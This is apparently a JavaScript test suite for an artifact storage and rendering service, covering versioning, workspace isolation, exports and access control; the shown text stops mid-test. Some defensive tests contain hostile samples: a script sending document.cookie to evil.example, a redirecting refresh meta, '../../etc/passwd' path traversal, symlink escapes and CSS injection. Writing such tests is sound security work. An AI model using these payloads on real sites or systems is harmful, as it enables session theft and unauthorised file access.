import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { Readable } from 'node:stream';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { ArtifactService } from '../dist/host/lib/service.js';
import { ArtifactStore } from '../dist/host/lib/store.js';
import { createHandler } from '../dist/host/lib/rpc.js';
import { registerArtifactsRoute } from '../dist/host/lib/http.js';
import { createTools } from '../dist/host/lib/tools.js';
import { checkPage } from '../dist/host/lib/checks.js';
import { apply as applySkill } from '../dist/host/skill-plugin.js';
import { apply as applyTools } from '../dist/host/tools-plugin.js';
import { parseArtifactAddress, formatArtifactAddress, tokensToCss, DEFAULT_TOKENS } from '../dist/contract.js';
import { composePage, PAGE_CSP } from '../dist/render.js';
import { mergeTokens } from '../dist/host/lib/design-system.js';
import { parseSheetWorkbook, serializeSheetWorkbook } from '../dist/sheet/index.js';
import { unzipSync, strFromU8 } from 'fflate';

let base;
let wsA;
let wsB;
let home;
let registry;

const PAGE = '<!doctype html><html><head><title>t</title></head><body><h1>Hello</h1></body></html>';

before(async () => {
  base = await fs.mkdtemp(path.join(os.tmpdir(), 'dsh-artifact-studio-'));
  wsA = path.join(base, 'project-a');
  wsB = path.join(base, 'project-b');
  home = path.join(base, 'home');
  await fs.mkdir(wsA, { recursive: true });
  await fs.mkdir(wsB, { recursive: true });
  const records = [
    { id: 'ws-a', path: wsA, sessionIds: ['ses-a'] },
    { id: 'ws-b', path: wsB, sessionIds: ['ses-b'] },
  ];
  registry = { get: (id) => records.find((item) => item.id === id), list: () => records };
});

after(async () => {
  await fs.rm(base, { recursive: true, force: true });
});

const WORKSPACE_BASE = 'artifacts/workspaces';

function storeHome(workspaceId, at = home) {
  return path.join(at, WORKSPACE_BASE, workspaceId);
}

async function exists(target) {
  try {
    await fs.lstat(target);
    return true;
  } catch {
    return false;
  }
}

function service(limits = {}, now) {
  return new ArtifactService(
    { workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home },
    registry,
    new ArtifactStore(limits, now),
    now,
  );
}

const agent = { origin: 'agent', action: 'create' };
const A = { workspaceId: 'ws-a' };
const B = { workspaceId: 'ws-b' };

async function rejects(promise, code) {
  await assert.rejects(promise, (error) => {
    assert.equal(error.code, code);
    return true;
  });
}

function toolsFor(sessionId, cwd, svc = service()) {
  const tools = createTools({
    service: svc,
    registry,
    workingDirectory: { ensure: async () => cwd },
  });
  const byName = Object.fromEntries(tools.map((tool) => [tool.name, tool]));
  const exec = { agent: { id: sessionId }, signal: new AbortController().signal };
  return { byName, run: (name, args) => byName[name].execute(args, exec) };
}

test('AC-001: artifact_create writes a page artifact at version 1', async () => {
  const { run } = toolsFor('ses-a', wsA);
  const value = await run('artifact_create', { type: 'page', title: 'Q3 dashboard', content: PAGE });
  assert.equal(value.version, 1);
  assert.equal(value.scope, 'workspace');
  assert.match(value.id, /^art_ws_[a-z0-9]{16}$/);
  const dir = path.join(storeHome('ws-a'), value.id);
  assert.equal(await exists(path.join(wsA, '.dsh')), false, 'the project must stay clean');
  if (process.platform !== 'win32') {
    assert.equal((await fs.stat(storeHome('ws-a'))).mode & 0o777, 0o700);
  }
  const manifest = JSON.parse(await fs.readFile(path.join(dir, 'artifact.json'), 'utf8'));
  assert.equal(manifest.version, 1);
  assert.equal(manifest.contentFile, 'index.html');
  assert.equal(await fs.readFile(path.join(dir, 'content/index.html'), 'utf8'), PAGE);
});

test('AC-002: invalid create input is refused and leaves no directory', async () => {
  const svc = service({ maxContentBytes: 64 });
  const root = storeHome('ws-a');
  const before = (await fs.readdir(root)).length;
  await rejects(svc.create(A, { type: 'deck', title: 'x', content: '', source: agent }), 'artifact/bad-request');
  await rejects(svc.create(A, { type: 'page', title: 'x'.repeat(121), content: '', source: agent }), 'artifact/bad-request');
  await rejects(svc.create(A, { type: 'page', title: 'big', content: 'x'.repeat(65), source: agent }), 'artifact/too-large');
  assert.equal((await fs.readdir(root)).length, before);
});

test('AC-003: accepted update increments the version', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Notes', content: '# One', source: agent });
  const updated = await svc.update(A, created.id, { baseVersion: 1, content: '# Two', source: agent });
  assert.equal(updated.version, 2);
  assert.notEqual(updated.contentHash, created.contentHash);
  const edited = await svc.update(A, created.id, {
    baseVersion: 2,
    edits: [{ oldText: 'Two', newText: 'Three' }],
    source: agent,
  });
  assert.equal(edited.version, 3);
  assert.equal((await svc.read(A, created.id)).content, '# Three');
});

test('AC-004: stale update is refused and content is intact', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Stale', content: 'v1', source: agent });
  await svc.update(A, created.id, { baseVersion: 1, content: 'v2', source: agent });
  await assert.rejects(svc.update(A, created.id, { baseVersion: 1, content: 'lost', source: agent }), (error) => {
    assert.equal(error.code, 'artifact/stale-version');
    assert.equal(error.details.current, 2);
    return true;
  });
  assert.equal((await svc.read(A, created.id)).content, 'v2');
});

test('AC-005: history lists one immutable snapshot per write', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'page', title: 'History', content: '<p>1</p>', source: agent });
  await svc.update(A, created.id, { baseVersion: 1, content: '<p>2</p>', source: agent });
  await svc.update(A, created.id, { baseVersion: 2, content: '<p>3</p>', source: agent });
  const versions = await svc.history(A, created.id);
  assert.deepEqual(versions.map((item) => item.version), [3, 2, 1]);
  assert.equal((await svc.read(A, created.id, 1)).content, '<p>1</p>');
  assert.ok(versions.every((item) => item.contentHash.startsWith('sha256:')));
});

test('AC-006: restore appends and preserves history', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Restore', content: 'one', source: agent });
  await svc.update(A, created.id, { baseVersion: 1, content: 'two', source: agent });
  await svc.update(A, created.id, { baseVersion: 2, content: 'three', source: agent });
  const restored = await svc.restore(A, created.id, 2, { origin: 'user', action: 'restore' });
  assert.equal(restored.version, 4);
  assert.equal(restored.source.restoredFrom, 2);
  assert.equal((await svc.read(A, created.id)).content, 'two');
  for (const [version, text] of [[1, 'one'], [2, 'two'], [3, 'three']]) {
    assert.equal((await svc.read(A, created.id, version)).content, text);
  }
});

test('AC-007: pruning keeps recent versions and never removes the current version', async () => {
  const svc = service({ maxVersions: 3 });
  const created = await svc.create(A, { type: 'doc', title: 'Prune', content: 'v1', source: agent });
  for (let version = 1; version < 6; version += 1) {
    await svc.update(A, created.id, { baseVersion: version, content: `v${version + 1}`, source: agent });
  }
  const versions = (await svc.history(A, created.id)).map((item) => item.version);
  assert.deepEqual(versions, [6, 5, 4]);
  const bytesCapped = service({ maxVersionsBytes: 1 });
  const big = await bytesCapped.create(A, { type: 'doc', title: 'Bytes', content: 'aaaa', source: agent });
  await bytesCapped.update(A, big.id, { baseVersion: 1, content: 'bbbb', source: agent });
  assert.deepEqual((await bytesCapped.history(A, big.id)).map((item) => item.version), [2]);
});

test('AC-008: gallery is workspace-scoped, newest first, and searchable', async () => {
  let tick = Date.parse('2026-01-01T00:00:00Z');
  const svc = service({}, () => new Date((tick += 1000)));
  const first = await svc.create(B, { type: 'page', title: 'Alpha report', content: '', source: agent });
  const second = await svc.create(B, { type: 'doc', title: 'Beta notes', content: '', source: agent });
  const page = await svc.list(B, {});
  assert.deepEqual(page.items.map((item) => item.id), [second.id, first.id]);
  const search = await svc.list(B, { query: 'alpha' });
  assert.deepEqual(search.items.map((item) => item.id), [first.id]);
  const other = await svc.list(A, {});
  assert.ok(other.items.every((item) => item.id !== first.id && item.id !== second.id));
});

test('AC-013: exports produce files with the expected signatures', async () => {
  const svc = service();
  const page = await svc.create(A, { type: 'page', title: 'Export page', content: PAGE, source: agent });
  const html = await svc.export(A, page.id, 'html');
  const htmlText = await fs.readFile(html.path, 'utf8');
  assert.match(htmlText, /data-artifact-tokens/);
  assert.match(htmlText, /--artifact-color-primary/);
  assert.ok(html.path.startsWith(path.join(storeHome('ws-a'), 'exports')));
  const doc = await svc.create(A, {
    type: 'doc',
    title: 'Export doc',
    content: '# Title\n\n- one\n- two\n\n1. first\n\n```js\nconst a = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n<script>alert(1)</script>\n',
    source: agent,
  });
  const md = await svc.export(A, doc.id, 'md');
  assert.equal(await fs.readFile(md.path, 'utf8'), (await svc.read(A, doc.id)).content);
  const docx = await svc.export(A, doc.id, 'docx');
  const bytes = await fs.readFile(docx.path);
  assert.equal(bytes.subarray(0, 2).toString('latin1'), 'PK');
  assert.equal(Buffer.from(docx.data, 'base64').length, bytes.length);
  const printable = await fs.readFile((await svc.export(A, doc.id, 'html')).path, 'utf8');
  assert.doesNotMatch(printable, /<script>alert/);
  await rejects(svc.export(A, page.id, 'docx'), 'artifact/unsupported-format');
});

test('AC-040: export selects an exact saved version through service route and tool', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Versioned output', content: 'original', source: agent });
  await svc.update(A, created.id, { baseVersion: 1, content: 'latest', source: agent });
  const old = await svc.export(A, created.id, 'md', 1);
  assert.equal(Buffer.from(old.data, 'base64').toString(), 'original');
  assert.match(old.fileName, /-v1-/);
  const route = await createHandler(svc)('export', { ...A, id: created.id, format: 'html', version: 1 });
  assert.equal(route.ok, true);
  assert.match(Buffer.from(route.value.data, 'base64').toString(), /original/);
  const { run } = toolsFor('ses-a', wsA, svc);
  const tool = await run('artifact_export', { id: created.id, format: 'docx', version: 1 });
  assert.match(tool.path, /-v1-/);
  await rejects(svc.export(A, created.id, 'md', 99), 'artifact/version-not-found');
});

test('AC-041: printable selects the requested version for pages and documents', async () => {
  const svc = service();
  for (const type of ['page', 'doc']) {
    const created = await svc.create(A, { type, title: `Print ${type}`, content: 'original print', source: agent });
    await svc.update(A, created.id, { baseVersion: 1, content: 'latest print', source: agent });
    const result = await createHandler(svc)('printable', { ...A, id: created.id, version: 1 });
    assert.equal(result.ok, true);
    assert.match(result.value.html, /original print/);
    assert.doesNotMatch(result.value.html, /latest print/);
  }
});

test('AC-042: export refuses a symlinked exports directory before an outside write', async () => {
  const project = path.join(base, 'export-confinement');
  const outside = path.join(base, 'export-outside');
  await fs.mkdir(project); await fs.mkdir(outside);
  const record = { id: 'export-test', path: project };
  const svc = new ArtifactService(
    { workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home },
    { get: () => record, list: () => [record] },
  );
  const target = { workspaceId: record.id };
  const created = await svc.create(target, { type: 'doc', title: 'Confined', content: 'private', source: agent });
  await fs.symlink(outside, path.join(storeHome(record.id), 'exports'));
  await rejects(svc.export(target, created.id, 'md'), 'artifact/forbidden-path');
  assert.deepEqual(await fs.readdir(outside), []);
});

test('AC-042: export root resolution refuses linked parents before creating directories', async () => {
  const linkedHome = path.join(base, 'home-linked-export'); const outside = path.join(base, 'linked-export-outside');
  await fs.mkdir(path.join(linkedHome, 'artifacts'), { recursive: true }); await fs.mkdir(outside);
  await fs.symlink(outside, path.join(linkedHome, WORKSPACE_BASE));
  const record = { id: 'linked-export', path: path.join(base, 'linked-export-project') };
  const svc = new ArtifactService({ workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home: linkedHome }, { get: () => record, list: () => [record] });
  await rejects(svc.export({ workspaceId: record.id }, 'art_ws_nonexistent001', 'html'), 'artifact/forbidden-path');
  assert.deepEqual(await fs.readdir(outside), []);
});

test('AC-014: traversal and symlink escapes are refused', async () => {
  const svc = service();
  await rejects(svc.read(A, '../../etc/passwd'), 'artifact/forbidden-path');
  await rejects(svc.read(A, 'art_ws_../../x'), 'artifact/forbidden-path');
  const outside = path.join(base, 'outside');
  await fs.mkdir(outside, { recursive: true });
  const linkId = 'art_ws_linklinklinklink';
  await fs.symlink(outside, path.join(storeHome('ws-a'), linkId));
  await rejects(svc.read(A, linkId), 'artifact/forbidden-path');
  const created = await svc.create(A, { type: 'doc', title: 'Linked content', content: 'safe', source: agent });
  const contentFile = path.join(storeHome('ws-a'), created.id, 'content/document.md');
  await fs.rm(contentFile);
  await fs.writeFile(path.join(outside, 'secret.md'), 'secret');
  await fs.symlink(path.join(outside, 'secret.md'), contentFile);
  await rejects(svc.read(A, created.id), 'artifact/forbidden-path');
  await rejects(svc.update(A, created.id, { baseVersion: 1, content: 'x', source: agent }), 'artifact/forbidden-path');
  assert.equal(await fs.readFile(path.join(outside, 'secret.md'), 'utf8'), 'secret');
});

test('AC-017: design tokens reach the page', async () => {
  const svc = service();
  const page = await svc.create(A, { type: 'page', title: 'Tokens', content: PAGE, source: agent });
  const before = await svc.read(A, page.id);
  assert.match(before.designCss, /--artifact-color-primary: #8c3e25;/);
  await svc.saveDesignSystem({ ...A, scope: 'workspace' }, { colors: { primary: '#ff0055' } });
  const after = await svc.read(A, page.id);
  assert.match(after.designCss, /--artifact-color-primary: #8c3e25;/);
  const next = await svc.create(A, { type: 'page', title: 'New tokens', content: PAGE, source: agent });
  assert.match((await svc.read(A, next.id)).designCss, /--artifact-color-primary: #ff0055;/);
  await rejects(
    svc.saveDesignSystem({ ...A, scope: 'workspace' }, { colors: { primary: 'red;} body{display:none' } }),
    'artifact/invalid-tokens',
  );
  await svc.clearWorkspaceDesignSystem(A);
});

test('AC-019: concurrent writers do not lose content', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Race', content: 'base', source: agent });
  const results = await Promise.allSettled([
    svc.update(A, created.id, { baseVersion: 1, content: 'from-user', source: { origin: 'user', action: 'update' } }),
    svc.update(A, created.id, { baseVersion: 1, content: 'from-agent', source: agent }),
  ]);
  const accepted = results.filter((item) => item.status === 'fulfilled');
  const refused = results.filter((item) => item.status === 'rejected');
  assert.equal(accepted.length, 1);
  assert.equal(refused.length, 1);
  assert.equal(refused[0].reason.code, 'artifact/stale-version');
  const current = await svc.read(A, created.id);
  assert.equal(current.version, 2);
  assert.ok(['from-user', 'from-agent'].includes(current.content));
});

test('AC-020: list paginates', async () => {
  const svc = service();
  const scratch = { workspaceId: 'ws-b' };
  const existing = (await svc.list(scratch, {})).total;
  for (let index = 0; index < 55 - existing; index += 1) {
    await svc.create(scratch, { type: 'doc', title: `Bulk ${index}`, content: '', source: agent });
  }
  const first = await svc.list(scratch, {});
  assert.equal(first.items.length, 50);
  assert.equal(first.total, 55);
  assert.equal(first.hasMore, true);
  const second = await svc.list(scratch, { offset: 50 });
  assert.equal(second.items.length, 5);
  assert.equal(second.hasMore, false);
  const { run } = toolsFor('ses-b', wsB, svc);
  const listed = await run('artifact_list', {});
  assert.equal(listed.items.length, 50);
  assert.equal(listed.hasMore, true);
});

test('AC-021: delete is recoverable from trash', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Trash me', content: 'keep me', source: agent });
  const result = await svc.remove(A, created.id);
  assert.equal(result.trashed, true);
  assert.ok(result.trashPath.includes(`${path.sep}.trash${path.sep}`));
  assert.equal(await fs.readFile(path.join(result.trashPath, 'content/document.md'), 'utf8'), 'keep me');
  assert.ok((await svc.list(A, {})).items.every((item) => item.id !== created.id));
  await rejects(svc.read(A, created.id), 'artifact/not-found');
});

test('AC-024: library artifacts are visible across workspaces', async () => {
  const { run } = toolsFor('ses-a', wsA);
  const value = await run('artifact_create', { type: 'doc', title: 'Brand one-pager', content: '# Brand', scope: 'library' });
  assert.match(value.id, /^art_lib_/);
  assert.equal(value.workspaceId, null);
  const stored = path.join(home, 'artifacts/v1', value.id, 'artifact.json');
  assert.ok((await fs.stat(stored)).isFile());
  if (process.platform !== 'win32') {
    assert.equal((await fs.stat(path.join(home, 'artifacts/v1'))).mode & 0o777, 0o700);
  }
  const fromB = toolsFor('ses-b', wsB);
  const listed = await fromB.run('artifact_list', { scope: 'library' });
  assert.ok(listed.items.some((item) => item.id === value.id));
  const read = await fromB.run('artifact_read', { id: value.id });
  assert.equal(read.content, '# Brand');
});

test('AC-025: workspace scope is isolated unless the call names the workspace', async () => {
  const svc = service();
  const own = await svc.create(A, { type: 'doc', title: 'Private to A', content: 'a-only', source: agent });
  assert.ok((await svc.list(B, {})).items.every((item) => item.id !== own.id));
  const fromB = toolsFor('ses-b', wsB, svc);
  await rejects(fromB.run('artifact_read', { id: own.id }), 'artifact/not-found');
  await rejects(fromB.run('artifact_update', { id: own.id, baseVersion: 1, content: 'x' }), 'artifact/not-found');
  const read = await fromB.run('artifact_read', { id: own.id, workspaceId: 'ws-a' });
  assert.equal(read.content, 'a-only');
  assert.equal(read.artifact.workspaceId, 'ws-a');
  assert.equal((await svc.read(A, own.id)).content, 'a-only');
});

test('AC-092: tool reads accept an explicit workspace id and default to the session workspace', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const remote = await svc.create(B, { type: 'doc', title: 'B notes', content: '# B', source: agent });
  const own = await svc.create(A, { type: 'doc', title: 'A notes', content: '# A', source: agent });

  await rejects(run('artifact_read', { id: remote.id }), 'artifact/not-found');
  const read = await run('artifact_read', { id: remote.id, workspaceId: 'ws-b' });
  assert.equal(read.content, '# B');
  assert.equal(read.artifact.workspaceId, 'ws-b');
  assert.equal(read.artifact.title, 'B notes');

  const remoteList = await run('artifact_list', { workspaceId: 'ws-b' });
  assert.ok(remoteList.items.some((item) => item.id === remote.id));
  assert.ok(remoteList.items.every((item) => item.workspaceId === 'ws-b'));
  const ownList = await run('artifact_list', {});
  assert.ok(ownList.items.some((item) => item.id === own.id));
  assert.ok(ownList.items.every((item) => item.id !== remote.id), 'the default list included another project');
  assert.ok((await run('artifact_list', { workspaceId: 'ws-b', query: 'B notes' })).items.some((item) => item.id === remote.id));

  await rejects(run('artifact_read', { id: remote.id, workspaceId: 'ws-missing' }), 'artifact/no-workspace');
  await rejects(run('artifact_list', { workspaceId: 'ws-missing' }), 'artifact/no-workspace');
});

test('AC-093: tool writes and the design system honor an explicit workspace id', async () => {
  const scratch = await fs.mkdtemp(path.join(os.tmpdir(), 'dsh-artifact-scope-'));
  try {
    const svc = new ArtifactService({ workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home: scratch }, registry);
    const { run } = toolsFor('ses-a', wsA, svc);

    const created = await run('artifact_create', { type: 'doc', title: 'Remote', content: 'v1', workspaceId: 'ws-b' });
    assert.equal(created.workspaceId, 'ws-b');
    assert.equal(created.scope, 'workspace');
    assert.equal(await exists(path.join(wsA, '.dsh')), false, 'the source project must stay clean');
    assert.ok(await exists(path.join(storeHome('ws-b', scratch), created.id, 'artifact.json')));
    assert.equal(await exists(path.join(storeHome('ws-a', scratch), created.id)), false);

    const updated = await run('artifact_update', { id: created.id, baseVersion: 1, content: 'v2', workspaceId: 'ws-b' });
    assert.equal(updated.version, 2);
    assert.equal((await svc.read(B, created.id)).content, 'v2');
    await rejects(run('artifact_update', { id: created.id, baseVersion: 2, content: 'lost' }), 'artifact/not-found');

    const exported = await run('artifact_export', { id: created.id, format: 'md', workspaceId: 'ws-b' });
    assert.ok(exported.path.startsWith(path.join(storeHome('ws-b', scratch), 'exports') + path.sep), exported.path);

    await svc.saveDesignSystem({ ...B, scope: 'workspace' }, { colors: { primary: '#0b0c0d' } });
    const tokens = await run('design_system_read', { workspaceId: 'ws-b' });
    assert.equal(tokens.source, 'workspace');
    assert.match(tokens.tokens, /#0b0c0d/);
    await run('design_system_update', { workspaceId: 'ws-b', tokens: { name: 'B brand' } });
    assert.equal((await svc.designSystem(B)).tokens.name, 'B brand');

    await rejects(run('artifact_list', { scope: 'library', workspaceId: 'ws-b' }), 'artifact/bad-request');
    await rejects(run('design_system_update', { scope: 'library', workspaceId: 'ws-b', tokens: { name: 'x' } }), 'artifact/bad-request');
    await rejects(run('design_system_read', { workspaceId: 'ws-missing' }), 'artifact/no-workspace');

    await run('artifact_delete', { id: created.id, workspaceId: 'ws-b' });
    assert.ok((await svc.list(B, {})).items.every((item) => item.id !== created.id));
  } finally {
    await fs.rm(scratch, { recursive: true, force: true });
  }
});

test('AC-026: scope prefixes and roots are enforced', async () => {
  const svc = service();
  const lib = await svc.create({ scope: 'library' }, { type: 'doc', title: 'Lib', content: '', source: agent });
  await rejects(svc.read({ ...A, scope: 'workspace' }, lib.id), 'artifact/unknown-scope');
  await rejects(svc.read(A, 'art_ws_UPPERCASEID00'), 'artifact/forbidden-path');
  await rejects(svc.create({}, { type: 'doc', title: 'No ws', content: '', source: agent }), 'artifact/no-workspace');
  await rejects(svc.create({ workspaceId: 'ws-missing' }, { type: 'doc', title: 'x', content: '', source: agent }), 'artifact/no-workspace');
  const handler = createHandler(svc);
  const bad = await handler('get', { workspaceId: 'ws-a', scope: 'elsewhere', id: lib.id });
  assert.equal(bad.ok, false);
  assert.equal(bad.error.code, 'artifact/unknown-scope');
  const plantedRoot = path.join(base, 'planted');
  const escapeHome = path.join(plantedRoot, 'home-escape');
  await fs.mkdir(plantedRoot, { recursive: true });
  const plantedRegistry = { get: () => ({ id: '../escape', path: plantedRoot }), list: () => [] };
  const planted = new ArtifactService({ workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home: escapeHome }, plantedRegistry);
  await rejects(planted.create({ workspaceId: '../escape' }, { type: 'doc', title: 'x', content: '', source: agent }), 'artifact/forbidden-path');
  assert.equal(await exists(escapeHome), false, 'an unsafe workspace id must not create a store');
});

test('AC-027: design system inherits and overrides per scope', async () => {
  const svc = service();
  await svc.saveDesignSystem({ scope: 'library' }, { colors: { primary: '#123456' }, name: 'Brand' });
  const inherited = await svc.designSystem(B);
  assert.equal(inherited.source, 'library');
  assert.equal(inherited.tokens.colors.primary, '#123456');
  await svc.saveDesignSystem({ ...B, scope: 'workspace' }, { colors: { accent: '#abcdef' } });
  const overridden = await svc.designSystem(B);
  assert.equal(overridden.source, 'workspace');
  assert.equal(overridden.tokens.colors.accent, '#abcdef');
  assert.equal(overridden.tokens.colors.primary, '#123456');
  const library = await svc.designSystem({});
  assert.equal(library.tokens.colors.accent, DEFAULT_TOKENS.colors.accent);
  assert.equal((await svc.designSystem(A)).source, 'library');
  await svc.clearWorkspaceDesignSystem(B);
  assert.equal((await svc.designSystem(B)).source, 'library');
});

test('AC-010: the policy precedes any comment or script the page supplies', async () => {
  const content =
    '<!-- <head> --><script>new Image().src="https://evil.example/?"+document.cookie</script>' +
    '<head><title>x</title></head><body><p>hi</p></body>';
  const html = composePage(content, ':root{}', PAGE_CSP, 'Trap');
  const policy = html.indexOf('Content-Security-Policy');
  assert.ok(policy > 0, 'no policy');
  assert.ok(policy < html.indexOf('<!--'), 'policy must come before the page body');
  assert.ok(policy < html.indexOf('new Image'), 'policy must come before page scripts');
  assert.equal((html.match(/Content-Security-Policy/g) ?? []).length, 1);
});

test('AC-010b: a refresh meta is removed from rendered and exported pages', async () => {
  const html = composePage('<meta http-equiv="refresh" content="0;url=https://evil.example"><p>ok</p>', ':root{}', PAGE_CSP, 'R');
  assert.doesNotMatch(html, /http-equiv="refresh"/i);
  assert.match(html, /<p>ok<\/p>/);
});

test('AC-029: tool results carry a content-free card payload under 1 KiB', async () => {
  const { byName, run } = toolsFor('ses-a', wsA);
  const value = await run('artifact_create', { type: 'page', title: 'Card', content: PAGE });
  const meta = byName.artifact_create.output.presentationMeta({}, value);
  assert.deepEqual(Object.keys(meta).sort(), ['id', 'kind', 'scope', 'title', 'type', 'v', 'version', 'workspaceId']);
  assert.equal(meta.workspaceId, 'ws-a');
  assert.ok(JSON.stringify(meta).length < 1024);
  assert.ok(!JSON.stringify(meta).includes('Hello'));
  const updated = await run('artifact_update', { id: value.id, baseVersion: 1, edits: [{ oldText: 'Hello', newText: 'Hi' }] });
  assert.equal(updated.version, 2);
  await rejects(run('artifact_update', { id: value.id, baseVersion: 2, edits: [{ oldText: 'missing', newText: 'x' }] }), 'artifact/edit-not-found');
  for (const tool of Object.values(byName)) {
    assert.ok(tool.description.length < 1200, `${tool.name} description is ${tool.description.length} characters`);
  }
});

test('AC-030: artifact addresses round-trip and reject foreign shapes', () => {
  const ws = formatArtifactAddress({ scope: 'workspace', workspaceId: 'ws/a b', id: 'art_ws_abcdefghij' });
  assert.deepEqual(parseArtifactAddress(ws), { scope: 'workspace', workspaceId: 'ws/a b', id: 'art_ws_abcdefghij' });
  const lib = formatArtifactAddress({ scope: 'library', id: 'art_lib_abcdefghij' });
  assert.deepEqual(parseArtifactAddress(lib), { scope: 'library', id: 'art_lib_abcdefghij' });
  assert.equal(parseArtifactAddress('dsh-resource://artifact/library/art_ws_abcdefghij'), undefined);
  assert.equal(parseArtifactAddress('dsh-resource://file/session/x/a.md'), undefined);
});

test('AC-031: a crash between the content and manifest rename is repaired from the snapshot', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Crash', content: 'v1', source: agent });
  const dir = path.join(storeHome('ws-a'), created.id);
  // Simulate: the new content landed, the manifest did not, and snapshot 2 was left behind.
  await svc.update(A, created.id, { baseVersion: 1, content: 'v2', source: agent });
  await fs.writeFile(path.join(dir, 'content/document.md'), 'interrupted half-write');
  const repaired = await svc.read(A, created.id);
  assert.equal(repaired.content, 'v2');
  assert.equal(repaired.version, 2);
  // An orphan snapshot newer than the manifest is not listed as history.
  await fs.mkdir(path.join(dir, 'versions/9/content'), { recursive: true });
  await fs.writeFile(path.join(dir, 'versions/9/meta.json'), JSON.stringify({ version: 9, createdAt: '2026-11-12T00:00:00.000Z', contentHash: 'sha256:x', contentBytes: 1, source: { origin: 'user', action: 'update' } }));
  assert.deepEqual((await svc.history(A, created.id)).map((entry) => entry.version), [2, 1]);
  // The snapshot is the last authority: with both copies tampered, the read fails loudly.
  await fs.writeFile(path.join(dir, 'content/document.md'), 'tampered');
  await fs.writeFile(path.join(dir, 'versions/2/content/document.md'), 'tampered');
  await rejects(svc.read(A, created.id), 'artifact/corrupt');
});

test('AC-032: a link inside the tree cannot redirect writes or deletes', async () => {
  const outside = path.join(base, 'outside-2');
  await fs.mkdir(outside, { recursive: true });
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Linked tree', content: 'safe', source: agent });
  const dir = path.join(storeHome('ws-a'), created.id);
  // Plant content/ as a link, then try to write through it.
  await fs.rename(path.join(dir, 'content'), path.join(dir, 'content-real'));
  await fs.symlink(outside, path.join(dir, 'content'));
  await rejects(svc.update(A, created.id, { baseVersion: 1, content: 'escaped', source: agent }), 'artifact/forbidden-path');
  assert.deepEqual(await fs.readdir(outside), []);
  await fs.rm(path.join(dir, 'content'));
  await fs.rename(path.join(dir, 'content-real'), path.join(dir, 'content'));
  // A link at the workspace store itself is refused, not followed.
  const linkedHome = path.join(base, 'home-linked-root');
  await fs.mkdir(path.join(linkedHome, WORKSPACE_BASE), { recursive: true });
  await fs.symlink(outside, path.join(linkedHome, WORKSPACE_BASE, 'lp'));
  const linkedRegistry = { get: () => ({ id: 'lp', path: path.join(base, 'linked-project') }), list: () => [] };
  const linked = new ArtifactService({ workspaceBase: WORKSPACE_BASE, libraryDir: 'artifacts/v1', home: linkedHome }, linkedRegistry);
  await rejects(linked.create({ workspaceId: 'lp' }, { type: 'doc', title: 'x', content: '', source: agent }), 'artifact/forbidden-path');
  assert.deepEqual(await fs.readdir(outside), []);
});

test('AC-033: a token save is atomic and never leaves a partial file', async () => {
  const svc = service();
  await svc.saveDesignSystem({ ...B, scope: 'workspace' }, { colors: { primary: '#010203' } });
  const file = path.join(storeHome('ws-b'), 'design-system.json');
  const text = await fs.readFile(file, 'utf8');
  assert.doesNotThrow(() => JSON.parse(text));
  const leftovers = (await fs.readdir(storeHome('ws-b'))).filter((name) => name.includes('.tmp'));
  assert.deepEqual(leftovers, []);
});

test('corrupt manifests are skipped by list', async () => {
  const svc = service();
  const created = await svc.create(A, { type: 'doc', title: 'Will corrupt', content: '', source: agent });
  await fs.writeFile(path.join(storeHome('ws-a'), created.id, 'artifact.json'), '{not json');
  const page = await svc.list(A, {});
  assert.ok(page.items.every((item) => item.id !== created.id));
  await rejects(svc.read(A, created.id), 'artifact/corrupt');
});

async function request(route, { method = 'POST', url = '/artifacts-rpc/list', payload, owner = true, reject = false }) {
  const body = payload === undefined ? '' : JSON.stringify(payload);
  const req = Readable.from(body === '' ? [] : [Buffer.from(body)]);
  req.method = method;
  req.url = url;
  req.headers = { 'x-owner': owner ? 'yes' : 'no', 'x-reject': reject ? 'yes' : 'no' };
  const res = {
    status: 0,
    body: '',
    writeHead(status) {
      this.status = status;
    },
    end(value = '') {
      this.body = value;
    },
  };
  await route.handler(req, res);
  return res;
}

test('SEC-001: the route serves only admitted owner peers', async () => {
  let route;
  registerArtifactsRoute(
    {
      webServer: {
        register(value) {
          route = value;
          return () => undefined;
        },
      },
      connection: {
        admit(req) {
          if (req.headers['x-reject'] === 'yes') return { rejection: 401 };
          return { peer: { principal: { kind: req.headers['x-owner'] === 'yes' ? 'owner' : 'guest' } } };
        },
      },
    },
    createHandler(service()),
  );
  const envelope = (method, payload) => ({ type: 'client-request', rpcId: 'r1', method, payload });
  assert.equal((await request(route, { reject: true, payload: envelope('list', A) })).status, 401);
  const guest = JSON.parse((await request(route, { owner: false, payload: envelope('list', A) })).body);
  assert.equal(guest.result.error.code, 'artifact/forbidden');
  const owner = JSON.parse((await request(route, { payload: envelope('list', A) })).body);
  assert.equal(owner.result.ok, true);
  assert.ok(Array.isArray(owner.result.value.items));
  assert.equal((await request(route, { method: 'GET', payload: envelope('list', A) })).status, 405);
  const mismatch = JSON.parse((await request(route, { payload: envelope('get', A) })).body);
  assert.equal(mismatch.result.error.code, 'artifact/bad-request');
});


test('AC-070: the artifact-design skill registers and the tools load without the skill registry', () => {
  const skills = [];
  applySkill({ skills: { register: (skill) => { skills.push(skill); return () => {}; } } });
  assert.equal(skills.length, 1);
  const [skill] = skills;
  assert.equal(skill.name, 'artifact-design');
  assert.ok(skill.description.length > 0 && skill.description.length < 300);
